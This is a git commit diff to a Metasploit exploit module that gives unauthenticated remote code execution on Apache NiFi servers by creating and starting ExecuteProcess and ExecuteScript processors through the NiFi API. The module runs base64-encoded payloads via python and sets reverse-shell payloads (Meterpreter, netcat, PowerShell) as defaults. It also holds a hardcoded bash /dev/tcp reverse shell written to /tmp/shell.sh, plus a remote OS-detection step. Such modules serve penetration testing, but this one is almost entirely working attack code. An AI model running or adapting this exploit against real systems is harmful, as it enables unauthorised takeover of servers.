3ee7f1289682369f25d38719a812f732d9335ac5
root <root@localhost.localdomain>
2018-11-19 09:24:51 -0600

    Update metasploit module

--- apache_nifi_rce.rb
+++ apache_nifi_rce.rb
@@ -8,24 +8,17 @@ require 'base64'
 
 class MetasploitModule < Msf::Exploit::Remote
   Rank = ExcellentRanking
-  HttpFingerprint = { :method => 'GET', :uri => '/nifi-api/flow/about', :pattern => [/NiFi/] }
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
     super(update_info(info,
-                      'Name'        => 'NiFi ExecuteScript Process File Creation',
+                      'Name'        => 'Apache NiFi RCE',
                       'Description' => %q(
     Apache's NiFi application allows users to run system commands
     using API calls to create, start, and stop ExecuteScript and
     ExecuteProcess processors.  If there is no authentication or
     roles set up, any user can use this to get command execution
     on the system.
-
-    Linux Targets: This exploit worked best with a python reverse
-    shell in testing.
-
-    Windows Targets: This exploit worked best with a powershell
-    reverse shell in testing.
 
     This has been tested on all Linux versions of NiFi from 1.2.0 to 1.8.0'
     This has been tested on NiFi version 1.8.0 for Windows.'
@@ -38,38 +31,38 @@ class MetasploitModule < Msf::Exploit::Remote
     ],
     'Privileged'  => false,
     'Arch' => [ARCH_CMD, ARCH_PYTHON, ARCH_X86, ARCH_X64],
-    'Platform' => %w{ win linux unix },
-    'Payload' => {
-      'BadChars' => "\x00",
-      'Space' => 2000,
-      'DisableNops' => true,
-      'Compat' => {
-        'PayloadType' => 'cmd',
-        'ConnectionType' => 'reverse'
-      }
-    },
+    'Platform' => %w{ win linux unix python },
     'Targets'     => [ 
-      ['Linux', 
-       'Platform' => 'unix',
-       'Payload' => {
-         'PayloadType' => 'cmd'
-       },
+      ['Linux - Python',
+       'Platform' => 'python',
+       'DefaultOptions' => {'PAYLOAD' => 'python/meterpreter/reverse_tcp'}
     ],
-    ['Windows',
+    ['Linux/Docker - CMD',
+     'Platform' => 'unix',
+     'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/reverse_netcat'},
+     'Payload' => {
+       'Compat' => {
+         'PayloadType' => 'cmd'
+       }
+     }
+    ],
+    ['Windows - Powershell',
      'Platform' => 'win',
+     'DefaultOptions' => {'PAYLOAD' => 'cmd/windows/reverse_powershell'},
      'Payload' => {
        'Compat' => {
          'PayloadType' => 'cmd',
          'RequiredCmd' => 'powershell'
        }
      }
-       ]
+    ]
     ],
     'DefaultTarget'  => 0,
     'DisclosureDate' => 'Jun 19 2018'))
     register_options(
       [
         OptString.new('NiFi-Path', [true, 'Location of NiFi API', '/nifi-api']),
+        OptString.new('Check-OS', [false, 'Check Operating System of server before exploiting, does same thing as check', 'true']),
         Opt::RPORT(8080)
       ])
     register_advanced_options(
@@ -83,7 +76,9 @@ class MetasploitModule < Msf::Exploit::Remote
       'uri' => normalize_uri(datastore["NiFi-Path"], '/process-groups/root')
     })
     if res && res.code == 200
-      print_status("NiFi Version: #{get_nifi_version}")
+      version = get_nifi_version
+      print_status("NiFi Version: #{version}")
+        check_os
       Exploit::CheckCode::Vulnerable
     else
       Exploit::CheckCode::Safe
@@ -93,42 +88,53 @@ class MetasploitModule < Msf::Exploit::Remote
   def exploit
     $target_id = get_target_id
 
-    processor = create_processor("ExecuteProcess", "Executor").get_json_document
 
-    commandArgs = "-c}\"import os; import base64; os.system(base64.b64decode('#{Base64.strict_encode64(payload.encoded)}').decode('utf-8'))\""
-    configure_processor(processor, "python", commandArgs)
+    # Check operating system if selected in options
+    if datastore['Check-OS'] == 'true'
+      print_status("Checking OS before beginning...")
+      check_os
+    end
 
-    print_status("Executing process for shell")
-    start_processor(processor)
+    print_status("Getting everything ready...")
+    exec_processor = create_command_processor("ExecuteProcess", "1").get_json_document
+
+
+    if datastore['target'] == 0
+      commandArgs = "-c}\"import base64, os, sys; a = base64.b64decode('#{Base64.strict_encode64(payload.encoded)}').decode('utf-8'); exec(a)\""
+    else
+      commandArgs = "-c}\"import base64, os, sys; a = base64.b64decode('#{Base64.strict_encode64(payload.encoded)}').decode('utf-8'); os.system(a)\""
+    end
+
+    configure_processor(exec_processor, "python", commandArgs)
+
+    sleep(1)
+    print_status("Attempting via native OS python method")
+    start_processor(exec_processor)
     sleep(1)
 
-    unless get_processor_status(processor).empty?
-      print_error("The server returned an error for process-based execution.")
-      sleep(1)
-      print_status("The application might be running on docker, or the server doesn't have python installed")
-      sleep(1)
-      print_status("Trying script-based execution")
-      print_warning("This method will not allow for cleaning up...you will have to do it manually!!")
+    if not get_processor_status(exec_processor).empty?
+      print_status("Looks like python isn't on the system...shifting to NiFi jython method with /bin/bash")
+      print_warning("This method will not allow for cleaning up if it works...you will have to do it manually!!")
 
-      second_proc = create_script_processor("ExecuteScript", "Scripter").get_json_document
+      script_proc = create_script_processor("ExecuteScript", "2").get_json_document
 
-      configure_script_processor(second_proc)
+      configure_script_processor(script_proc)
       sleep(1)
 
       print_status("Attempting via Script Processor...")
-      start_processor(second_proc)
+      start_processor(script_proc)
       sleep(1)
 
       # Cleanup if Script Processor Fails
-      stop_processor(second_proc)
+      stop_processor(script_proc)
       sleep(1)
-      delete_processor(second_proc)
+      delete_processor(script_proc)
     end
 
     # Cleanup
-    stop_processor(processor)
+    stop_processor(exec_processor)
     sleep(5)
-    delete_processor(processor)
+    delete_processor(exec_processor)
   end
 
   # Identifies the workspace that API requests will go to
@@ -161,10 +167,88 @@ class MetasploitModule < Msf::Exploit::Remote
     }).get_json_document['bulletins']
   end
 
+  def check_os
+    os_checker = create_command_processor("ExecuteProcess", "OS-Check").get_json_document
+    configure_processor(os_checker, "cat", "/proc/1/cgroup")
+    start_processor(os_checker)
+    sleep(5)
+    print_status("Two more seconds and results should be in.")
+    sleep(2)
+    stop_processor(os_checker)
+    params = {
+      "provenance":{
+        "request":{
+          "maxResults":1000,
+          "summarize":true,
+          "incrementalResults":false,
+          "searchTerms":{
+            "ProcessorID":os_checker['id']
+          },
+        },
+      }
+
+    }
+
+    prov_params = JSON.pretty_generate(params)
+
+    prov = send_request_raw({
+      'method' => 'POST',
+      'uri' => normalize_uri(datastore["NiFi-Path"], '/provenance'),
+      'headers' => { 'Accept' => '*/*', 'Content-Type' => 'application/json;charset=UTF-8' },
+      'data' => prov_params
+    }).get_json_document
+
+    sleep(1)
+
+    send_request_raw({
+      'method' => 'DELETE',
+      'uri' => normalize_uri(datastore["NiFi-Path"], '/provenance', prov['provenance']['id']),
+    })
+
+
+    if prov['provenance']['results']['totalCount'] != 0
+      prov_id = prov['provenance']['results']['provenanceEvents'][0]['id']
+      os_info = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri('/nifi-content-viewer', "?ref=http%3A%2F%2F#{datastore['RHOST']}%3A#{datastore['RPORT']}%2Fnifi-api%2Fprovenance-events%2F#{prov_id}%2Fcontent%2Foutput"),
+      })
+
+      if os_info.body.downcase.include?("docker")
+        print_good "NiFi is definitely running in a Docker container"
+        print_status "Meterpreter probably won't work"
+        print_status "*********"
+
+        if datastore['target'] == 1
+          print_good "You have the best target selected for this OS"
+        else
+          print_status "Set target to 'Linux - CMD' for best odds"      
+        end
+
+        print_status "*********"
+      else
+        print_good "It looks like NiFi is running in Linux"
+        print_status "Meterpreter payloads might be a good bet"
+        print_status "*********"
+
+        if datastore['target'] == 0
+          print_good "You have the best target selected for this OS"
+        else
+          print_status "Set target to 'Linux - Python' for best odds"      
+        end
+
+        print_status "*********"
+      end
+    else
+      print_error "Unable to detect OS definitively"
+      print_status "This is either an old version of NiFi or Windows based"
+    end
+    #delete_processor(os_checker)
+  end
+
+
   # Creates an ExecuteProcess processor
   # This is always the first method attempted
-  def create_processor(type, name)
-
+  def create_command_processor(type, name)
     params = {
       :revision => {
         :clientId => "",
@@ -192,7 +276,6 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def configure_processor(processor, command, commandArgs)
-
     params = {
       :component => {
         :id => processor["id"],
@@ -236,7 +319,6 @@ class MetasploitModule < Msf::Exploit::Remote
   # Creates an ExcecuteScript processor
   # This is the second attempt if python is not installed on a Linux target
   def create_script_processor(type, name)
-
     params = {
       :revision => {
         :clientId => "",
@@ -264,7 +346,6 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def configure_script_processor(processor)
-
     # This method should only execute on Linux machines
     # so hardcoding the payload should always work
     cmd1 = 'echo "/bin/bash -i >& /dev/tcp/' + datastore["LHOST"].to_s + "/" + datastore["LPORT"].to_s + ' 0>&1" > /tmp/shell.sh'
@@ -273,7 +354,6 @@ class MetasploitModule < Msf::Exploit::Remote
     cmd4 = "rm /tmp/shell.sh"
 
     scriptBody = "import os; os.system('#{cmd1}'); os.system('#{cmd2}'); os.system('#{cmd3}'); os.system('#{cmd4}')"
-
     params = {
       :component => {
         :id => processor["id"],
@@ -337,7 +417,6 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def stop_processor(processor)
-
     params = {
       :revision => {
         :clientId => "",
